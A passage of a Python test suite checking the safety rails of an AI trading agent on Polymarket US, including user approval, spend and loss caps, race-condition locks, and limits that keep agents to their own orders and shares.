        return self._body


class _FakePolymarket:
    """The only stub on the order path: the HTTP client. The public gateway and
    the signed API answer as Polymarket US does; anything else is a 404 (a failed
    read, which the app reports as unknown, not zero)."""

    def __init__(self):
        self.calls: list = []

    def _answer(self, method, url, params, body):
        self.calls.append((method, url, params, body))
        path = url.split(".polymarket.us", 1)[-1]
        if path == f"/v1/market/slug/{_CHAIN_CID}":
            return _FakeResponse(200, {"market": _CHAIN_MARKET})
        if path == f"/v1/markets/{_CHAIN_CID}/book":
            return _FakeResponse(200, {"marketData": {
                "bids": [{"px": {"value": "0.48"}, "qty": "1000"}],
                "offers": [{"px": {"value": "0.50"}, "qty": "1000"}],
                "state": "MARKET_STATE_OPEN"}})
        if path == f"/v1/markets/{_CHAIN_CID}/bbo":
            return _FakeResponse(200, {"marketData": {
                "bestBid": {"value": "0.48"}, "bestAsk": {"value": "0.50"}}})
        if method == "GET" and path == "/v1/orders/open":
            return _FakeResponse(200, {"orders": []})
        if method == "POST" and path == "/v1/orders":
            return _FakeResponse(200, {"id": "venue1", "executions": [
                {"type": "EXECUTION_TYPE_NEW", "order": {
                    "id": "venue1", "state": "ORDER_STATE_NEW", "marketSlug": _CHAIN_CID,
                    "intent": "ORDER_INTENT_BUY_LONG", "quantity": 10, "cumQuantity": 0,
                    "price": {"value": "0.50", "currency": "USD"}}}]})
        return _FakeResponse(404, {"error": "not found"})

    async def get(self, url, params=None, timeout=None, **_kw):
        return self._answer("GET", url, params, None)

    async def request(self, method, url, headers=None, json=None, params=None, **_kw):
        assert headers and headers.get("X-PM-Access-Key") == _CHAIN_KEY, "unsigned authed call"
        assert headers.get("X-PM-Signature"), "unsigned authed call"
        return self._answer(method.upper(), url, params, json)

    def orders(self):
        return [c for c in self.calls if c[0] == "POST" and c[1].endswith("/v1/orders")]


def test_an_approved_agent_order_runs_the_real_chain_to_the_venue(fresh, monkeypatch):
    """Tool → rails → approval → terminal_trade → polymarket_api, with only
    the HTTP client stubbed: the order that reaches "Polymarket" is one real
    signed GTC buy from a throwaway key, and what came back is booked."""
    import base64
    import os

    import mcp_rails
    import polymarket_api as api
    import polymarket_auth as auth
    import terminal as term

    creds = fresh / "creds"
    creds.mkdir()
    monkeypatch.setattr(auth, "_credentials_dir", lambda: creds)
    monkeypatch.setattr(auth, "_cached_creds", None)
    auth.save_credentials(_CHAIN_KEY, base64.b64encode(os.urandom(32)).decode())
    venue = _FakePolymarket()

    async def _client():
        return venue
    monkeypatch.setattr(api, "_get_client", _client)
    monkeypatch.setattr(api, "_meta", {})
    monkeypatch.setattr(term, "_cache", {})
    monkeypatch.setattr(term, "_inflight", {})
    # Looking the market up names its tokens to the live book socket, which
    # would open a real connection; the chain under test is the HTTP one.
    monkeypatch.setattr(term, "subscribe", lambda *a, **k: None)
    # The follow-up reconcile is a background read 3 s later; this test's
    # event loop is gone by then.
    monkeypatch.setattr(tt, "_spawn", lambda coro: coro.close())
    _fake_service(monkeypatch, mcp_trade_mode="live", mcp_live_approval=True,
                  mcp_max_order_usd=0.0, mcp_daily_limit_usd=0.0,
                  mcp_agents=[{"id": "default", "mode": "live"}])

    fid = _forecast(70.0, cid=_CHAIN_CID)
    res = _call("place_order", {"conditionId": _CHAIN_CID, "side": "yes", "action": "buy",
                                "size": 10, "priceCents": 50, "forecastId": fid})
    assert not res["isError"], _text(res)
    rid = json.loads(_text(res))["approvalId"]
    assert venue.orders() == [], "sent before the user approved"

    done = _run(mcp_rails.decide(rid, True))
    assert done["ok"], done
    paths = [(c[0], c[1].split(".polymarket.us")[-1]) for c in venue.calls]
    # The book was read for the edge and the live market for the touch, the
    # order's own quote and our open orders checked, before the one send.
    assert ("GET", f"/v1/markets/{_CHAIN_CID}/book") in paths
    assert ("GET", f"/v1/market/slug/{_CHAIN_CID}") in paths
    assert ("GET", "/v1/orders/open") in paths
    assert paths[-1] == ("POST", "/v1/orders")
    [(_m, _url, _p, body)] = venue.orders()
    assert body["marketSlug"] == _CHAIN_CID and body["intent"] == "ORDER_INTENT_BUY_LONG"
    assert float(body["quantity"]) == 10 and float(body["price"]["value"]) == 0.5
    st = json.loads(_text(_call("get_orders", {"approvalId": rid})))
    assert st["status"] == "approved" and st["orderId"] == "venue1"
    with db.get_db() as conn:
        row = conn.execute("SELECT origin, status FROM terminal_orders "
                           "WHERE order_id='venue1'").fetchone()
    assert row["origin"] == "ai"
    assert mcp_rails.spent_today("live") == 5.0


def test_the_per_order_cap(fresh, monkeypatch):
    _live(monkeypatch, mcp_max_order_usd=25.0)
    sent = _no_venue(monkeypatch)
    _priced(monkeypatch)
    res = _call("place_order", {**_BUY, "size": 100, "forecastId": _forecast()})
    assert res["isError"] and "per-order cap" in _text(res)
    assert sent == []


def test_spend_today_counts_what_could_still_spend(fresh):
    import mcp_rails

    def row(conn, *, committed, ok=1, status=None, action="buy", mode="live", age=None):
        conn.execute(
            "INSERT INTO mcp_orders (created_at, network, mode, condition_id, side, "
            "action, size, price_cents, committed_usd, ok, status) "
            "VALUES (" + ("datetime('now')" if age is None else f"datetime('now','{age}')")
            + ",'mainnet',?,'0xabc','yes',?,1,50,?,?,?)",
            (mode, action, committed, ok, status))
    with db.get_db() as conn:
        row(conn, committed=50)                              # sent: counts
        row(conn, committed=5, ok=0, status="unknown")       # lost response: counts
        row(conn, committed=7, ok=0, status="pending")       # awaiting approval: counts
        row(conn, committed=9, ok=0, status="pending", age="-30 minutes")  # expired: no
        row(conn, committed=11, ok=0)                        # refused: no
        row(conn, committed=13, action="sell")               # exit: no
        row(conn, committed=17, mode="paper")                # paper: not live money
    assert mcp_rails.spent_today("live") == 62.0
    assert mcp_tools.spent_today_usd() == 62.0


def test_an_order_whose_outcome_is_unknown_keeps_counting_and_keeps_its_id(fresh, monkeypatch):
    # The ticket could not tell whether the venue took the order (the send
    # failed ambiguously and a lookup found nothing yet). The rail must fail
    # closed: the spend still counts, and the id is kept for cancel/reconcile.
    import mcp_rails
    _live(monkeypatch)
    _no_venue(monkeypatch)
    _priced(monkeypatch, 5.0)
    oid = "0x" + "cd" * 32

    async def _place(order, *, origin="manual", standing_id=None):
        return {"ok": False, "orderId": oid, "status": "unknown", "filledSize": None,
                "message": "Polymarket did not confirm this order"}
    monkeypatch.setattr(tt, "place", _place)

    res = _call("place_order", {**_BUY, "forecastId": _forecast()})
    assert res["isError"]
    with db.get_db() as conn:
        r = conn.execute("SELECT status, order_id, committed_usd FROM mcp_orders "
                         "ORDER BY id DESC LIMIT 1").fetchone()
    assert (r["status"], r["order_id"], r["committed_usd"]) == ("unknown", oid, 5.0)
    assert mcp_rails.spent_today("live") == 5.0


def test_the_daily_cap(fresh, monkeypatch):
    _live(monkeypatch, mcp_daily_spend_usd=100.0, mcp_max_order_usd=0.0)
    with db.get_db() as conn:
        _agent_buy(conn, oid="0xold", size=180, filled_shares=0)   # $90 today
    sent = _no_venue(monkeypatch)
    _priced(monkeypatch)
    res = _call("place_order", {**_BUY, "size": 30, "conditionId": "0xabc",
                                "forecastId": _forecast()})
    assert res["isError"] and "daily cap" in _text(res)
    assert sent == []


def test_parallel_buys_cannot_both_slip_under_the_daily_cap(fresh, monkeypatch):
    """Each buy alone fits; both together do not. The money lock must make the
    second one see the first one's row."""
    _live(monkeypatch, mcp_daily_spend_usd=20.0, mcp_max_order_usd=0.0)
    _no_venue(monkeypatch)
    _priced(monkeypatch)
    sent = []

    async def _place(order, *, origin="manual", standing_id=None):
        await asyncio.sleep(0.05)  # the venue round trip the race lives in
        sent.append(order)
        return {"ok": True, "orderId": f"0xr{len(sent)}", "message": "sent"}
    monkeypatch.setattr(tt, "place", _place)
    fid = _forecast()

    async def both():
        return await asyncio.gather(
            mcp_tools.call("place_order", {**_BUY, "size": 30, "forecastId": fid}, _session()),
            mcp_tools.call("place_order", {**_BUY, "size": 30, "forecastId": fid}, _session()))
    a, b = asyncio.new_event_loop().run_until_complete(both())
    assert len(sent) == 1
    assert sorted([a["isError"], b["isError"]]) == [False, True]


def test_an_agent_sells_only_what_its_own_orders_filled(fresh, monkeypatch):
    _live(monkeypatch)
    sent = _no_venue(monkeypatch)
    _priced(monkeypatch)
    with db.get_db() as conn:
        _agent_buy(conn, oid="0xb1", size=10, filled_shares=6)    # 6 of 10 filled
        _agent_buy(conn, oid="0xb2", size=10, filled_shares=0)    # rested, nothing
    res = _call("place_order", {**_BUY, "action": "sell", "size": 10})
    assert res["isError"] and "6 filled shares" in _text(res)
    assert sent == []
    res = _call("place_order", {**_BUY, "action": "sell", "size": 6})
    assert not res["isError"], _text(res)
    # The 6 are now spoken for: a second sell of the same shares is refused.
    res = _call("place_order", {**_BUY, "action": "sell", "size": 1})
    assert res["isError"]
    assert len(sent) == 1


def _slow_sells(monkeypatch):
    """A venue whose sells take a round trip; every size that reached it."""
    sold = []

    async def _pv(req):
        return {"blockers": [], "proceedsUsd": 2.5}

    async def _sell(req, *, origin="manual", priced=None):
        await asyncio.sleep(0.05)  # the venue round trip the race lives in
        sold.append(float(req["size"]))
        return {"ok": True, "orderId": f"0xs{len(sold)}", "sentSize": req["size"],
                "limitCents": 45.0, "filledSize": req["size"], "message": "sold"}
    monkeypatch.setattr(tt, "sell_position_preview", _pv)
    monkeypatch.setattr(tt, "sell_position", _sell)
    return sold


_CLOSE = {"conditionId": "0xabc", "side": "yes", "size": 6}


def test_parallel_closes_cannot_both_sell_the_agents_shares(fresh, monkeypatch):
    """The agent owns 6; the wallet holds more (the user's). Two closes of 6
    sent together must not both reach the venue: the second would be the
    user's shares."""
    _live(monkeypatch)
    _no_venue(monkeypatch)
    sold = _slow_sells(monkeypatch)
    with db.get_db() as conn:
        _agent_buy(conn, oid="0xb1", size=6, filled_shares=6)

    async def both():
        return await asyncio.gather(
            mcp_tools.call("close_position", dict(_CLOSE), _session()),
            mcp_tools.call("close_position", dict(_CLOSE), _session()))
    a, b = asyncio.new_event_loop().run_until_complete(both())
    assert sold == [6.0], "both closes reached the venue"
    assert sorted([a["isError"], b["isError"]]) == [False, True]


def test_a_stop_cannot_reserve_shares_a_close_is_selling(fresh, monkeypatch):
    """A stop added while a close of the same shares is at the venue would
    fire later on the user's shares (exits skip approval)."""
    import mcp_rails
    _live(monkeypatch)
    _no_venue(monkeypatch)
    sold = _slow_sells(monkeypatch)
    with db.get_db() as conn:
        _agent_buy(conn, oid="0xb1", size=6, filled_shares=6)

    async def race():
        close = asyncio.ensure_future(
            mcp_tools.call("close_position", dict(_CLOSE), _session()))
        await asyncio.sleep(0.01)  # the close is at the venue now
        stop = await mcp_tools.call("manage_standing_instructions", {
            "action": "add", "kind": "stopLoss", "conditionId": "0xabc",
            "side": "yes", "triggerCents": 40, "size": 6}, _session())
        return await close, stop
    close, stop = asyncio.new_event_loop().run_until_complete(race())
    assert not close["isError"] and sold == [6.0]
    assert stop["isError"] and "at most 0" in _text(stop)
    assert not mcp_rails._agent_standing("default"), "a stop was armed on sold shares"


def _sells(monkeypatch, result=None, raises=None):
    """A venue for live closes, answering at once: every size that reached
    sell_position, and every request that was only priced."""
    sold, priced = [], []

    async def _pv(req):
        priced.append(dict(req))
        return {"blockers": [], "proceedsUsd": 2.5, "fillableSize": req.get("size"),
                "limitCents": 45.0}

    async def _sell(req, *, origin="manual", priced=None):
        sold.append(float(req["size"]))
        if raises is not None:
            raise raises
        return result or {"ok": True, "orderId": f"0xs{len(sold)}", "sentSize": req["size"],
                          "limitCents": 45.0, "filledSize": req["size"], "message": "sold"}
    monkeypatch.setattr(tt, "sell_position_preview", _pv)
    monkeypatch.setattr(tt, "sell_position", _sell)
    return sold, priced


def _sell_rows():
    with db.get_db() as conn:
        return [dict(r) for r in conn.execute(
            "SELECT * FROM mcp_orders WHERE action='sell' ORDER BY id")]


def test_a_live_close_sells_no_more_than_the_agents_own_fills(fresh, monkeypatch):
    import mcp_rails
    _live(monkeypatch)
    _no_venue(monkeypatch)
    sold, _ = _sells(monkeypatch)
    with db.get_db() as conn:
        _agent_buy(conn, oid="0xb1", size=10, filled_shares=6)   # 6 of 10 filled
    res = _call("close_position", {**_CLOSE, "size": 7})
    assert res["isError"] and "leave 6 shares" in _text(res)
    assert sold == [] and _sell_rows() == []
    # No size = everything it may sell, and not a share more.
    res = _call("close_position", {"conditionId": "0xabc", "side": "yes"})
    assert not res["isError"], _text(res)
    assert sold == [6.0]
    assert mcp_rails.live_net("0xabc", "yes", "default") == 0.0
    assert _call("close_position", {**_CLOSE, "size": 1})["isError"]
    assert sold == [6.0]


def test_a_live_close_cannot_sell_another_agents_or_the_users_shares(fresh, monkeypatch):
    _live(monkeypatch, mcp_agents=[{"id": "default", "mode": "live"},
                                   {"id": "sam", "name": "Sam", "mode": "live"}])
    _no_venue(monkeypatch)
    sold, _ = _sells(monkeypatch)
    with db.get_db() as conn:
        _agent_buy(conn, oid="0xsam", size=6, filled_shares=6, agent="sam")
        # The user's own fill in the same market: in the wallet, no agent's.
        conn.execute(
            "INSERT INTO terminal_fills (trade_id, order_id, condition_id, side, "
            "action, size, price_cents, origin, network, filled_at) "
            "VALUES ('t-me','0xme','0xabc','yes','buy',20,50,'manual','mainnet',"
            "datetime('now'))")
    res = _call("close_position", dict(_CLOSE))          # Default owns none of it
    assert res["isError"] and "the user's" in _text(res)
    assert sold == []
    res = _run(mcp_tools.call("close_position", {**_CLOSE, "size": 7},
                              dict(_session(), agent="sam")))
    assert res["isError"] and sold == [], "Sam sold past its own 6"
    res = _run(mcp_tools.call("close_position", dict(_CLOSE), dict(_session(), agent="sam")))
    assert not res["isError"], _text(res)
    assert sold == [6.0]
    assert [r["agent_id"] for r in _sell_rows()] == ["sam"]


def test_a_live_close_preview_sends_and_books_nothing(fresh, monkeypatch):
    import mcp_rails
    _live(monkeypatch)
    _no_venue(monkeypatch)
    sold, priced = _sells(monkeypatch)
    with db.get_db() as conn:
        _agent_buy(conn, oid="0xb1", size=6, filled_shares=6)
    res = _call("close_position", {**_CLOSE, "preview_only": True})
    assert not res["isError"], _text(res)
    assert json.loads(_text(res))["proceedsUsd"] == 2.5
    assert len(priced) == 1 and priced[0]["paper"] is False
    assert sold == [] and _sell_rows() == []
    assert mcp_rails.live_net("0xabc", "yes", "default") == 6.0


def test_a_live_close_the_venue_refused_or_errored_is_not_booked_as_sold(fresh, monkeypatch):
    """Refused: nothing sold, so the allowance is intact. Errored: it may have
    reached the venue, so it counts as sold until known (fail closed)."""
    import mcp_rails
    _live(monkeypatch)
    _no_venue(monkeypatch)
    with db.get_db() as conn:
        _agent_buy(conn, oid="0xb1", size=6, filled_shares=6)
    _sells(monkeypatch, result={"ok": False, "status": None, "orderId": None,
                                "sentSize": 6, "limitCents": 45.0, "filledSize": None,
                                "message": "Sell refused: the book moved."})
    res = _call("close_position", dict(_CLOSE))
    assert res["isError"] and "book moved" in _text(res)
    row = _sell_rows()[-1]
    assert row["ok"] == 0 and row["status"] is None and not row["filled"]
    assert mcp_rails.order_status(row["id"], "default")["status"] == "refused"
    assert mcp_rails.live_net("0xabc", "yes", "default") == 6.0

    _sells(monkeypatch, result={"ok": False, "status": "error", "orderId": None,
                                "sentSize": 6, "limitCents": 45.0, "filledSize": None,
                                "message": "Request timed out"})
    res = _call("close_position", dict(_CLOSE))
    assert res["isError"]
    row = _sell_rows()[-1]
    assert row["ok"] == 0 and row["status"] == "unknown" and not row["filled"]
    assert mcp_rails.live_net("0xabc", "yes", "default") == 0.0


def test_a_live_close_whose_send_raises_is_booked_unknown(fresh, monkeypatch):
    """The send blew up, so the sell may be on the venue. With no row, the
    agent's allowance still showed the shares and a second close sold them
    again — the user's shares, the second time."""
    import mcp_rails
    _live(monkeypatch)
    _no_venue(monkeypatch)
    with db.get_db() as conn:
        _agent_buy(conn, oid="0xb1", size=6, filled_shares=6)
    sold, _ = _sells(monkeypatch, raises=RuntimeError("socket closed after send"))
    res = _call("close_position", dict(_CLOSE))
    assert res["isError"] and "may or may not have reached" in _text(res)
    rows = _sell_rows()
    assert len(rows) == 1 and rows[0]["status"] == "unknown" and rows[0]["ok"] == 0
    assert rows[0]["size"] == 6.0
    assert mcp_rails.live_net("0xabc", "yes", "default") == 0.0
    assert _call("close_position", dict(_CLOSE))["isError"]
    assert sold == [6.0]


def test_an_agent_cancels_its_own_live_order_and_it_is_booked_at_its_fills(
        fresh, monkeypatch):
    _live(monkeypatch, mcp_agents=[{"id": "default", "mode": "live"},
                                   {"id": "sam", "name": "Sam", "mode": "live"}])
    _no_venue(monkeypatch)
    with db.get_db() as conn:
        _agent_buy(conn, oid="0xmine", size=10, filled_shares=4)
        _agent_buy(conn, oid="0xsams", size=10, filled_shares=0, agent="sam")
    asked = []

    async def _venue(oid, *, market=""):
        asked.append(oid)
        return {"canceled": [oid]}
    monkeypatch.setattr(tt.api, "cancel_order", _venue)
    res = _call("cancel_order", {"orderId": "0xsams"})
    assert res["isError"] and "another of the user's agents" in _text(res)
    res = _call("cancel_order", {"orderId": "0xmine"})
    assert not res["isError"], _text(res)
    assert asked == ["0xmine"]
    with db.get_db() as conn:
        r = conn.execute("SELECT status, filled FROM mcp_orders "
                         "WHERE order_id='0xmine'").fetchone()
    assert r["status"] == "cancelled" and r["filled"] == 4.0


def test_cancel_all_over_mixed_statuses_touches_only_the_agents_own(fresh, monkeypatch):
    _live(monkeypatch, mcp_agents=[{"id": "default", "mode": "live"},
                                   {"id": "sam", "name": "Sam", "mode": "live"}])
    _no_venue(monkeypatch)
    _mock_book(monkeypatch)
    statuses = {"0xresting": "placed", "0xgone": "canceled", "0xkilled": "unmatched",
                "0xstuck": "placed", "0xdone": "filled"}
    with db.get_db() as conn:
        for oid, st in statuses.items():
            _agent_buy(conn, oid=oid, size=10, filled_shares=10 if st == "filled" else 0)
            conn.execute(
                "INSERT INTO terminal_orders (condition_id, side, action, order_type, "
                "requested_size, requested_price_cents, order_id, status, origin, "
                "network, reconciled) VALUES ('0xabc','yes','buy','GTC',10,50,?,?,"
                "'ai','mainnet',1)", (oid, st))
        _agent_buy(conn, oid="0xsams", size=10, filled_shares=0, agent="sam")
    asked = []

    async def _venue(oid, *, market=""):
        asked.append(oid)
        if oid == "0xresting":
            return {"canceled": [oid]}
        raise tt.api.PolymarketAPIError(
            400, "order already matched" if oid == "0xdone" else "busy")
    monkeypatch.setattr(tt.api, "cancel_order", _venue)
    # A resting paper buy of the agent's, and one of the user's.
    with tp.using_book("ai"):
        _run(tp.place({"conditionId": "0xabc", "side": "yes", "action": "buy",
                       "priceCents": 10, "size": 5, "orderType": "GTC"}, {}))
    _run(tp.place({"conditionId": "0xabc", "side": "yes", "action": "buy",
                   "priceCents": 10, "size": 5, "orderType": "GTC"}, {}))

    out = json.loads(_text(_call("cancel_all_orders", {})))
    assert sorted(asked) == ["0xdone", "0xresting", "0xstuck"], "skipped/foreign orders asked"
    assert (out["liveCancelled"], out["liveAlreadyFilled"], out["liveFailed"]) == (1, 1, 1)
    assert out["liveRefused"] == {"0xstuck": "busy"} and out["ok"] is False
    assert out["paperCancelled"] == 1
    assert tp.orders()["orders"][0]["status"] == "resting", "the user's paper order was cancelled"
    with db.get_db() as conn:
        st = {r["order_id"]: r["status"] for r in conn.execute(
            "SELECT order_id, status FROM mcp_orders WHERE order_id IS NOT NULL")}
    assert st["0xresting"] == "cancelled"
    assert st["0xstuck"] is None and st["0xsams"] is None
    assert st["0xdone"] == "filled", "10 of 10 on the ledger is booked as filled"


def test_exits_are_not_capped(fresh, monkeypatch):
    _live(monkeypatch, mcp_max_order_usd=1.0, mcp_daily_spend_usd=1.0)
    sent = _no_venue(monkeypatch)
    _priced(monkeypatch, 500.0)
    with db.get_db() as conn:
        _agent_buy(conn, oid="0xb1", size=10, filled_shares=10)
    res = _call("place_order", {**_BUY, "action": "sell"})
    assert not res["isError"], _text(res)
    assert len(sent) == 1


def test_the_loss_stop_halts_buys_never_sells(fresh, monkeypatch):
    import mcp_rails
    _live(monkeypatch, mcp_daily_loss_usd=50.0)
    sent = _no_venue(monkeypatch)
    _priced(monkeypatch)

    async def _down(mode, c):
        return {"realizedUsd": -60.0, "unrealizedUsd": 0.0, "unmarked": [],
                "unmarkedCostUsd": 0.0, "lossUsd": 60.0}
    monkeypatch.setattr(mcp_rails, "day_loss", _down)
    with db.get_db() as conn:
        _agent_buy(conn, oid="0xb1", size=10, filled_shares=10)
    res = _call("place_order", {**_BUY, "forecastId": _forecast()})
    assert res["isError"] and "Daily loss stop" in _text(res)
    res = _call("place_order", {**_BUY, "action": "sell"})
    assert not res["isError"], _text(res)
    assert len(sent) == 1


def test_an_unreadable_live_book_refuses_buys(fresh, monkeypatch):
    import mcp_rails
    _live(monkeypatch)
    sent = _no_venue(monkeypatch)
    _priced(monkeypatch)

    async def _boom(day):
        raise RuntimeError("ledger down")
    monkeypatch.setattr(mcp_rails, "_live_day_pnl", _boom)
    res = _call("place_order", {**_BUY, "forecastId": _forecast()})
    assert res["isError"] and "could not be read" in _text(res)
    assert sent == []


def _bid_at(monkeypatch, bid):
    async def _summaries(ids):
        return [{"conditionId": c, "bid": bid, "ask": bid + 2.0, "resolvedOutcome": None}
                for c in ids]
    monkeypatch.setattr(tp.term, "_summaries_for", _summaries)


def test_a_live_buy_pulls_fresh_fills_before_the_loss_stop(fresh, monkeypatch):
    """An agent GTC buy of 200 @ 50¢ filled at the venue after the last
    reconcile, and its market has settled against it: down $100 against a $20
    stop. Only a reconcile writes that fill to the ledger the stop replays, and
    nothing on the buy path ran one."""
    import mcp_rails
    _live(monkeypatch, mcp_daily_loss_usd=20.0, mcp_daily_spend_usd=0.0)
    sent = _no_venue(monkeypatch)
    _priced(monkeypatch)

    async def _settled(ids):
        return [{"conditionId": c, "resolvedOutcome": "no",
                 "closeTime": mcp_rails.today() + "T12:00:00Z"} for c in ids]
    monkeypatch.setattr(tp.term, "_summaries_for", _settled)
    with db.get_db() as conn:
        _agent_buy(conn, oid="0xgtc", size=200, filled_shares=0, cid="0xdown")

    async def _reconcile(limit=0):
        with db.get_db() as conn:
            conn.execute(
                "INSERT OR IGNORE INTO terminal_fills (trade_id, order_id, condition_id, "
                "side, action, size, price_cents, origin, network, filled_at) "
                "VALUES ('t-gtc','0xgtc','0xdown','yes','buy',200,50,'ai','mainnet',"
                "datetime('now'))")
        return {"inserted": 1, "matched": 0}
    monkeypatch.setattr(tt, "reconcile_fills", _reconcile)
    res = _call("place_order", {**_BUY, "forecastId": _forecast()})
    assert res["isError"] and "down $100.00" in _text(res), _text(res)
    assert sent == []


_REAL_RECONCILE = tt.reconcile_fills


def test_a_fill_ledger_that_cannot_be_pulled_refuses_live_buys(fresh, monkeypatch):
    """reconcile_fills reports a failed read in its result, not by raising;
    a stop reading the stale ledger would be guessing."""
    _live(monkeypatch)
    sent = _no_venue(monkeypatch)
    _priced(monkeypatch)
    monkeypatch.setattr(tt, "reconcile_fills", _REAL_RECONCILE)
    monkeypatch.setattr(tt.auth, "credentials_present", lambda env=None: True)
    with db.get_db() as conn:
        conn.execute("INSERT INTO terminal_orders (condition_id, side, action, order_type, "
                     "requested_size, requested_price_cents, order_id, status) "
                     "VALUES ('0xabc','yes','buy','GTC',1,50,'o-open','placed')")

    async def _down(*_a, **_k):
        raise RuntimeError("the API is unreachable")
    monkeypatch.setattr(tt.api, "get_order", _down)
    res = _call("place_order", {**_BUY, "forecastId": _forecast()})
    assert res["isError"] and "could not be read" in _text(res), _text(res)
    assert sent == []


def test_previews_share_one_ledger_read_and_a_place_reads_it_fresh(fresh, monkeypatch):
    """One ledger read asks the venue about every open order. The owner's live
    test previewed 60 markets in a row, read it for every one, and got the
    exchange refusing the app's reads. Previews reuse a recent read (parallel ones
    share one); a place still reads it fresh."""
    _live(monkeypatch)
    sent = _no_venue(monkeypatch)
    _priced(monkeypatch, cost=1.0)
    reads = []
    fail = []

    async def _reconcile(limit=0):
        reads.append(1)
        if fail:
            return {"ok": False, "inserted": 0, "matched": 0, "note": "down"}
        return {"inserted": 0, "matched": 0}
    monkeypatch.setattr(tt, "reconcile_fills", _reconcile)
    fid = _forecast()

    async def _go():
        for _ in range(5):
            r = await mcp_tools.call("preview_order", {**_BUY, "forecastId": fid}, _session())
            assert not r["isError"], _text(r)
        await asyncio.gather(*(mcp_tools.call("preview_order", {**_BUY, "forecastId": fid},
                                              _session()) for _ in range(4)))
        after_previews = len(reads)
        placed = await mcp_tools.call("place_order", {**_BUY, "forecastId": fid}, _session())
        return after_previews, placed
    after_previews, placed = _run(_go())
    assert after_previews == 1, f"{after_previews} ledger reads for 9 previews"
    assert not placed["isError"], _text(placed)
    assert len(reads) == 2, "a place must read the ledger fresh"
    assert len(sent) == 1

    # A failed read is never reused: the next preview tries again.
    reads.clear()
    fail.append(1)

    async def _twice():
        a = await mcp_tools.call("preview_order", {**_BUY, "forecastId": fid}, _session())
        b = await mcp_tools.call("preview_order", {**_BUY, "forecastId": fid}, _session())
        return a, b
    a, b = _run(_twice())
    assert len(reads) == 2
    assert "could not be read" in json.dumps(b)


def test_open_positions_are_shown_but_do_not_count_toward_the_live_stop(fresh, monkeypatch):
    """Bought 10 YES at 50¢ (one agent order); the bid is now 20¢ → −$3.00 open.
    Nothing has closed, so the stop has nothing to count yet."""
    import mcp_rails
    _live(monkeypatch)
    with db.get_db() as conn:
        _agent_buy(conn, oid="0xb1", size=10, filled_shares=10, cid="0xdown")
        _agent_buy(conn, oid="0xb2", size=10, filled_shares=10, cid="0xup", price=10.0)

    async def _summaries(ids):
        return [{"conditionId": c, "bid": 20.0 if c == "0xdown" else 60.0,
                 "ask": 22.0 if c == "0xdown" else 62.0, "resolvedOutcome": None}
                for c in ids]
    monkeypatch.setattr(tp.term, "_summaries_for", _summaries)
    d = _run(mcp_rails.day_loss("live", {}))
    assert d["unrealizedUsd"] == 2.0          # net, for display
    assert d["openLossUsd"] == 3.0
    assert d["lossUsd"] == 0.0, "an open position tripped the stop before its market closed"


def test_a_settled_winner_offsets_todays_losses_and_an_open_gain_does_not(fresh, monkeypatch):
    """The live test, 2026-11-06: a winner that had already paid out was treated as
    an open gain, so the stop read $6.13 on a $5.71 day. Bought 10 at 50¢ on each."""
    import mcp_rails
    _live(monkeypatch)
    with db.get_db() as conn:
        _agent_buy(conn, oid="0xb1", size=10, filled_shares=10, cid="0xlost")
        _agent_buy(conn, oid="0xb2", size=10, filled_shares=10, cid="0xwon")
        _agent_buy(conn, oid="0xb3", size=10, filled_shares=10, cid="0xopen")

    today = mcp_rails.today() + "T12:00:00Z"

    async def _summaries(ids):
        return [{"conditionId": "0xlost", "resolvedOutcome": "no", "closeTime": today},
                {"conditionId": "0xwon", "resolvedOutcome": "yes", "closeTime": today},
                {"conditionId": "0xopen", "resolvedOutcome": None, "bid": 90.0, "ask": 92.0}]
    monkeypatch.setattr(tp.term, "_summaries_for", _summaries)
    d = _run(mcp_rails.day_loss("live", {}))
    assert d["realizedUsd"] == 0.0            # -$5.00 lost, +$5.00 won
    assert d["lossUsd"] == 0.0, d
    assert d["unrealizedUsd"] == 4.0          # the open gain, for display only

    async def _lost_more(ids):
        return [{"conditionId": "0xlost", "resolvedOutcome": "no", "closeTime": today},
                {"conditionId": "0xwon", "resolvedOutcome": "no", "closeTime": today},
                {"conditionId": "0xopen", "resolvedOutcome": None, "bid": 90.0, "ask": 92.0}]
    monkeypatch.setattr(tp.term, "_summaries_for", _lost_more)
    assert _run(mcp_rails.day_loss("live", {}))["lossUsd"] == 10.0, "an open gain hid a loss"


def test_get_market_hands_over_the_rules_text(fresh, monkeypatch):
    import terminal

    async def _market(cid, include_raw=False):
        assert include_raw
        return {"conditionId": cid, "title": "T", "_raw": {"description": " Settles on RTI. "}}
    monkeypatch.setattr(terminal, "market", _market)
    m = json.loads(_text(_call("get_market", {"conditionId": "0xabc"})))["market"]
    assert m["rules"] == "Settles on RTI."
    assert "_raw" not in m


def test_a_market_with_no_rules_says_null_and_an_unreadable_one_is_null(fresh, monkeypatch):
    import terminal

    async def _market(cid, include_raw=False):
        return {"conditionId": cid, "_raw": {}} if cid == "0xabc" else None
    monkeypatch.setattr(terminal, "market", _market)
    assert json.loads(_text(_call("get_market", {"conditionId": "0xabc"})))["market"]["rules"] is None
    assert json.loads(_text(_call("get_market", {"conditionId": "0xdef"})))["market"] is None


def test_a_second_live_buy_sees_the_first_ones_debit(fresh, monkeypatch):
    import trader
    _live(monkeypatch)
    forced = []

    async def _refresh(_cfg, force=False):
        forced.append(force)
        return 0, 0
    monkeypatch.setattr(trader, "refresh_balance", _refresh)
    _call("preview_order", {**_BUY, "forecastId": _forecast()})
    assert forced == [True]


def test_an_agent_cannot_cancel_the_users_live_order(fresh, monkeypatch):
    _live(monkeypatch)
    cancelled = []

    async def _cancel(oid):
        cancelled.append(oid)
        return {"ok": True, "message": "ok"}
    monkeypatch.setattr(tt, "cancel", _cancel)
    res = _call("cancel_order", {"orderId": "0xusers"})
    assert res["isError"] and "the user's" in _text(res)
    assert cancelled == []


def test_cancel_all_does_not_count_a_filled_order_as_cancelled(fresh, monkeypatch):
    """cancel_all walks every live order the agent ever placed. A filled one
    is refused by the venue, and was counted as "Cancelled" and booked
    `cancelled` in the agent's order log, every call. An order our row calls
    filled is still tried, and whatever the venue cancels really is cancelled."""
    _live(monkeypatch)
    _no_venue(monkeypatch)
    with db.get_db() as conn:
        _agent_buy(conn, oid="0xfilled", size=10, filled_shares=10)
        _agent_buy(conn, oid="0xpart", size=10, filled_shares=4)
        for oid in ("0xfilled", "0xpart"):
            conn.execute(
                "INSERT INTO terminal_orders (condition_id, side, action, "
                "order_type, requested_size, requested_price_cents, order_id, "
                "status, origin, network, reconciled) "
                "VALUES ('0xabc','yes','buy','GTC',10,50,?,'filled','ai','mainnet',1)",
                (oid,))
    asked = []

    async def _venue(oid, *, market=""):
        asked.append(oid)
